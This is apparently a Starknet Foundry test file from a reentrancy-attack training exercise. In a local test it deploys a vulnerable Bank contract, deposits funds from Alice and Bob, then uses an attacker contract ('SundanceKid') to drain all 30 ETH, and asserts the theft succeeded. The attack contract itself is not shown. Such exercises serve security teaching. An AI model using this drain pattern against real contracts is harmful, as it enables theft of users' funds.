use openzeppelin_token::erc20::interface::{IERC20Dispatcher, IERC20DispatcherTrait};
use starknet::{ContractAddress};
use snforge_std::{
    declare, ContractClassTrait, DeclareResultTrait,  
    start_cheat_caller_address, stop_cheat_caller_address,
};
use reentrancy_attacks::bank_attack::eth_bank::{IBankDispatcher, IBankDispatcherTrait};
use reentrancy_attacks::bank_attack::sundance_kid::{ISundanceKidDispatcher, ISundanceKidDispatcherTrait};
use reentrancy_attacks::utils::helpers::{
    deploy_eth, mint_erc20, one_ether,
};

// Helper function to deploy the Bank contract
fn deploy_bank(currency: ContractAddress) -> (ContractAddress, IBankDispatcher) {
    // Declaring the contract class
    let contract_class = declare("Bank").unwrap().contract_class();
    // Deploying the contract, and getting the address
    let (address, _) = contract_class.deploy(@array![currency.into()]).unwrap();
    (address, IBankDispatcher { contract_address: address })
}

// Helper function to deploy the robber contract
fn deploy_the_kid(
    attacker: ContractAddress, 
    bank: ContractAddress,
    eth: IERC20Dispatcher
) -> (ContractAddress, ISundanceKidDispatcher) 
    {
    // Declaring the contract class
    let contract_class = declare("SundanceKid").unwrap().contract_class();
    let mut data = array![];
    Serde::serialize(@attacker, ref data);
    Serde::serialize(@bank, ref data);
    Serde::serialize(@eth, ref data);
    // Deploying the contract, and getting the address
    let (address, _) = contract_class.deploy(@data).unwrap();
    (address, ISundanceKidDispatcher { contract_address: address })
}




#[test]
fn test_bank_attack() {
    // Creating the addresses of Alice, Bob, and Attacker
    let alice: ContractAddress = 1.try_into().unwrap();
    let bob: ContractAddress = 2.try_into().unwrap();
    let attacker: ContractAddress = 3.try_into().unwrap();

    // Deploying the ETH and Bank contracts
    let (eth_address, eth_dispatcher) = deploy_eth();
    let (bank_address, bank_dispatcher) = deploy_bank(eth_address);

    // Mint 10 ETH to Alice, 20 ETH to Bob, and 1 ETH to Attacker
    mint_erc20(eth_address, alice, 10 * one_ether());
    mint_erc20(eth_address, bob, 20 * one_ether());
    mint_erc20(eth_address, attacker, one_ether());

    // Approve and deposit 10 ETH from Alice
    start_cheat_caller_address(eth_address, alice);
    eth_dispatcher.approve(bank_address, 10 * one_ether());
    stop_cheat_caller_address(eth_address);
    start_cheat_caller_address(bank_address, alice);
    bank_dispatcher.deposit(10 * one_ether());
    stop_cheat_caller_address(bank_address);

    // Approve and deposit 20 ETH from Bob
    start_cheat_caller_address(eth_address, bob);
    eth_dispatcher.approve(bank_address, 20 * one_ether());
    stop_cheat_caller_address(eth_address);
    start_cheat_caller_address(bank_address, bob);
    bank_dispatcher.deposit(20 * one_ether());
    stop_cheat_caller_address(bank_address);

    // Check that the bank has 30 ETH
    let bank_balance = eth_dispatcher.balance_of(bank_address);
    assert_eq!(bank_balance, 30 * one_ether());

    
    // Steal all the ETH from the bank
    // Attack Start //

    // Deploy malicious contract >:|
    let (kid_address, kid_dispatcher) = deploy_the_kid(attacker, bank_address, eth_dispatcher);
    println!("Kid address: {:?}", kid_address);
    // Transfer attacker ETH to kid
    start_cheat_caller_address(eth_address, attacker);
    eth_dispatcher.transfer(kid_address, one_ether());
    stop_cheat_caller_address(eth_address);
    
    let kid_balance = eth_dispatcher.balance_of(kid_address);
    println!("The Sundance Kid balance is: {}", kid_balance);

    let bank_balance_before_attack = eth_dispatcher.balance_of(bank_address);
    println!("Bank balance before attack: {}", bank_balance_before_attack);

    // Attacc
    start_cheat_caller_address(kid_address, attacker);
    kid_dispatcher.put_your_hands_up();
    stop_cheat_caller_address(kid_address);


    // Attack END //

    // Make sure the attack was successful (Attacker has 31 ETH, Bank has 0)
    let attacker_balance = eth_dispatcher.balance_of(attacker);
    let bank_balance = eth_dispatcher.balance_of(bank_address);
    println!("The attacker's balance is: {}", attacker_balance);
    println!("The bank's balance is: {}", bank_balance);
    assert(attacker_balance == 31 * one_ether(), 'Wrong balance of attacker');
    assert(bank_balance == 0, 'Wrong balance of bank');
}

